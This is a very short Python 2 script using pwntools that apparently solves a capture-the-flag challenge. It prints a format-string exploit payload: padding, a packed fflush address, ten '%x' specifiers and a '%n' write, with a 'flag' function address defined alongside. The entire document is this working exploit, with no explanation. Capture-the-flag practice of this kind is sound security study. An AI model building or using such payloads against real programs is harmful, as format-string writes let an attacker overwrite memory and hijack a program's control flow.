from pwn import *

fflush_01 = 0x08048767
flag = 0x804870b

print "A" * 4 + p32(fflush_01) + "%x " * 10 + "%n"
